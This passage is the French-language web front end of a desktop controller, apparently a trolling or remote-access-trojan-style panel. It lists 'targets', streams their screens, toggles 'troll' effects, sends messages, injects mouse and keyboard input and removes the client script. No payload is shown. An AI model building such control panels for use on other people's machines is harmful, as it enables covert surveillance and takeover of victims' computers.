            btnStopProtocol.disabled = false;
            if (btnKillClient) btnKillClient.disabled = false;
            fpsSlider.disabled = false;
            qualitySlider.disabled = false;
            btnRemoteControl.disabled = false;

            populateWindowsDropdown(target.info.windows);
            updateTrollButtonsUI();

            if (streamCanvas) {
                streamCanvas.style.display = "none";
                if (streamCtx) streamCtx.clearRect(0, 0, streamCanvas.width, streamCanvas.height);
            }
            streamView.style.display = "none";
            streamPlaceholder.style.display = "block";
            streamPlaceholder.querySelector(".screen-placeholder-title").textContent = "Connexion au flux...";
            streamStatus.textContent = "CONNECTÉ";
            streamStatus.className = "live-tag";

            if (window.pywebview && window.pywebview.api) {
                window.pywebview.api.selectTarget(targetId);
            }
        }

        function deselectTarget() {
            selectedTargetId = null;
            btnDeselect.disabled = true;
            updateTargetListUI();

            infoPc.textContent = "-";
            infoUser.textContent = "-";
            infoOs.textContent = "-";
            infoIp.textContent = "-";

            trollMsgInput.disabled = true;
            btnSendMsg.disabled = true;
            btnStartProtocol.disabled = true;
            btnStopProtocol.disabled = true;
            if (btnKillClient) btnKillClient.disabled = true;
            fpsSlider.disabled = true;
            qualitySlider.disabled = true;
            btnRemoteControl.disabled = true;
            if (remoteControlActive) {
                toggleRemoteControl(false);
            }

            Object.keys(trollButtons).forEach(name => {
                const btn = trollButtons[name].btn;
                btn.disabled = true;
                btn.classList.remove("active");
            });

            if (streamCanvas) {
                streamCanvas.style.display = "none";
                if (streamCtx) streamCtx.clearRect(0, 0, streamCanvas.width, streamCanvas.height);
            }
            streamView.style.display = "none";
            streamView.src = "";
            streamPlaceholder.style.display = "block";
            streamPlaceholder.querySelector(".screen-placeholder-title").textContent = "Aucun flux actif";
            streamStatus.textContent = "HORS LIGNE";
            streamStatus.className = "live-tag";
            
            if (window.pywebview && window.pywebview.api) {
                window.pywebview.api.deselectTarget();
            }
            logMessage("Appareil désélectionné.", "info");
        }

        function updateTrollButtonsUI() {
            const target = activeTargets[selectedTargetId];
            if (!target) return;

            Object.keys(trollButtons).forEach(name => {
                const item = trollButtons[name];
                const isActive = target.trolls[name];
                item.btn.disabled = false;
                if (isActive) {
                    item.btn.classList.add("active");
                } else {
                    item.btn.classList.remove("active");
                }
            });

            const elusiveContainer = document.getElementById("elusive-window-container");
            elusiveContainer.style.display = selectedTargetId ? "block" : "none";
        }

        // Trolls
        Object.keys(trollButtons).forEach(name => {
            trollButtons[name].btn.addEventListener("click", () => {
                const target = activeTargets[selectedTargetId];
                if (!target) return;

                const newState = !target.trolls[name];
                target.trolls[name] = newState;

                let extra = null;
                if (name === "elusive_window" && newState) {
                    extra = document.getElementById("elusive-window-select").value;
                }

                if (window.pywebview && window.pywebview.api) {
                    window.pywebview.api.toggleTroll(selectedTargetId, name, newState, extra);
                }
                updateTrollButtonsUI();
            });
        });

        btnSendMsg.addEventListener("click", () => {
            const msg = trollMsgInput.value.trim();
            if (!msg) return;

            if (window.pywebview && window.pywebview.api) {
                window.pywebview.api.sendTrollMessage(selectedTargetId, msg);
            }
            trollMsgInput.value = "";
        });

        trollMsgInput.addEventListener("keypress", (e) => {
            if (e.key === "Enter") btnSendMsg.click();
        });

        btnStartProtocol.addEventListener("click", () => {
            if (window.pywebview && window.pywebview.api) {
                window.pywebview.api.startProtocol(selectedTargetId);
            }
        });

        btnStopProtocol.addEventListener("click", () => {
            if (window.pywebview && window.pywebview.api) {
                window.pywebview.api.stopProtocol(selectedTargetId);
            }
        });

        if (btnKillClient) {
            btnKillClient.addEventListener("click", () => {
                if (confirm("Voulez-vous vraiment fermer et nettoyer définitivement le script client sur cette machine ?")) {
                    if (window.pywebview && window.pywebview.api) {
                        window.pywebview.api.killClient(selectedTargetId);
                    }
                    deselectTarget();
                }
            });
        }

        function sendStreamSettings() {
            if (window.pywebview && window.pywebview.api) {
                window.pywebview.api.updateStreamSettings(
                    selectedTargetId, 
                    parseInt(fpsSlider.value), 
                    parseInt(qualitySlider.value)
                );
            }
        }

        fpsSlider.addEventListener("change", sendStreamSettings);
        qualitySlider.addEventListener("change", sendStreamSettings);
        fpsSlider.addEventListener("input", (e) => { fpsVal.textContent = e.target.value; });
        qualitySlider.addEventListener("input", (e) => { qualityVal.textContent = e.target.value + "%"; });
        btnDeselect.addEventListener("click", deselectTarget);

        // Contrôle à distance
        window.setRemoteControlState = function(active) {
            if (remoteControlActive === active) return;
            remoteControlActive = active;
            if (active) {
                btnRemoteControl.classList.add("active");
                btnRemoteControl.textContent = "🎮 Contrôle à distance (Actif)";
            } else {
                btnRemoteControl.classList.remove("active");
                btnRemoteControl.textContent = "🎮 Contrôle à distance (Inactif)";
                if (navigator.keyboard && navigator.keyboard.unlock) navigator.keyboard.unlock();
                if (document.fullscreenElement === streamContainer) document.exitFullscreen().catch(() => {});
            }
            logMessage(`Contrôle à distance : ${active ? 'Activé' : 'Désactivé'}.`, "info");
        };

        function toggleRemoteControl(active) {
            remoteControlActive = active;
            if (active) {
                btnRemoteControl.classList.add("active");
                btnRemoteControl.textContent = "🎮 Contrôle à distance (Actif)";
                if (streamContainer.requestFullscreen) {
                    streamContainer.requestFullscreen().then(() => {
                        if (navigator.keyboard && navigator.keyboard.lock) {
                            navigator.keyboard.lock().catch(() => {});
                        }
                    }).catch(() => toggleRemoteControl(false));
                }
            } else {
                btnRemoteControl.classList.remove("active");
                btnRemoteControl.textContent = "🎮 Contrôle à distance (Inactif)";
                if (navigator.keyboard && navigator.keyboard.unlock) navigator.keyboard.unlock();
                if (document.fullscreenElement === streamContainer) document.exitFullscreen().catch(() => {});
            }

            if (window.pywebview && window.pywebview.api) {
                window.pywebview.api.toggleRemoteControl(selectedTargetId, active);
            }
        }

        document.addEventListener("fullscreenchange", () => {
            if (document.fullscreenElement !== streamContainer && remoteControlActive) {
                toggleRemoteControl(false);
            }
        });

        btnRemoteControl.addEventListener("click", () => {
            if (!selectedTargetId) return;
            toggleRemoteControl(!remoteControlActive);
        });

        let lastMouseMoveTime = 0;
        [streamCanvas, streamView].forEach(elem => {
            if (!elem) return;
            elem.addEventListener("mousemove", (e) => {
                if (remoteControlActive && selectedTargetId) {
                    const now = Date.now();
                    if (now - lastMouseMoveTime > 35) {
                        lastMouseMoveTime = now;
                        const rect = elem.getBoundingClientRect();
                        const rx = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width));
                        const ry = Math.max(0, Math.min(1, (e.clientY - rect.top) / rect.height));
                        
                        if (window.pywebview && window.pywebview.api) {
                            window.pywebview.api.sendRemoteMouseMove(selectedTargetId, rx, ry);
                        }
                    }
                }
            });

            elem.addEventListener("mousedown", (e) => {
                if (remoteControlActive && selectedTargetId) {
                    e.preventDefault();
                    let button = "left";
                    if (e.button === 1) button = "middle";
                    else if (e.button === 2) button = "right";
                    if (window.pywebview && window.pywebview.api) {
                        window.pywebview.api.sendRemoteMouseClick(selectedTargetId, button, "down");
                    }
                }
            });

            elem.addEventListener("mouseup", (e) => {
                if (remoteControlActive && selectedTargetId) {
                    e.preventDefault();
                    let button = "left";
                    if (e.button === 1) button = "middle";
                    else if (e.button === 2) button = "right";
                    if (window.pywebview && window.pywebview.api) {
                        window.pywebview.api.sendRemoteMouseClick(selectedTargetId, button, "up");
                    }
                }
            });

            elem.addEventListener("contextmenu", (e) => {
                if (remoteControlActive) e.preventDefault();
            });
        });

        window.addEventListener("keydown", (e) => {
            if (remoteControlActive && selectedTargetId) {
                e.preventDefault();
                if (window.pywebview && window.pywebview.api) {
                    window.pywebview.api.sendRemoteKey(selectedTargetId, e.keyCode, "down");
                }
            }
        });

        window.addEventListener("keyup", (e) => {
            if (remoteControlActive && selectedTargetId) {
                e.preventDefault();
                if (window.pywebview && window.pywebview.api) {
                    window.pywebview.api.sendRemoteKey(selectedTargetId, e.keyCode, "up");
                }
            }
        });

        window.addEventListener("blur", () => {
            if (remoteControlActive && selectedTargetId) {
                [16, 17, 18, 91, 92].forEach(vk => {
                    if (window.pywebview && window.pywebview.api) {
                        window.pywebview.api.sendRemoteKey(selectedTargetId, vk, "up");
                    }
                });
            }
        });

        window.addEventListener("pywebviewready", () => {
            logMessage("Liaison logicielle initialisée avec le moteur Python.", "cmd");
            logMessage("Serveurs d'écoute actifs. En attente d'un appareil...", "info");
        });
    </script>
</body>
</html>"""
